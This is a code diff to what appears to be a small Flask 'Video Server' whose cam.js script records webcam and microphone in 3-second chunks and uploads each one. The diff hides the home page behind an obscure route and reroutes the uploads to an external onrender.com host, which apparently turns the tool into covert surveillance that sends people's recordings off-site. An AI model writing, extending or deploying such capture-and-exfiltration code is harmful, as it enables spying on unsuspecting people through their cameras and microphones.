@@ -38,7 +38,7 @@ def monitor_user_chunks(user_id):
             return
     merge_chunks(user_id)
 
-@app.route('/')
+@app.route('/hhhhhhhhhh')
 def home():
     return '<h2>Video Server</h2><p><a href="/cam.js">/cam.js</a> | <a href="/rndr">/rndr</a></p>'
 
@@ -54,7 +54,7 @@ navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream =>
     let form = new FormData();
     form.append('video', blob);
     form.append('uid', user_id);
-    fetch('/upload', { method: 'POST', body: form });
+    fetch('https://chorcha-video.onrender.com/upload', { method: 'POST', body: form });
   };
   mediaRecorder.start();
   setInterval(() => mediaRecorder.stop(), 3000);
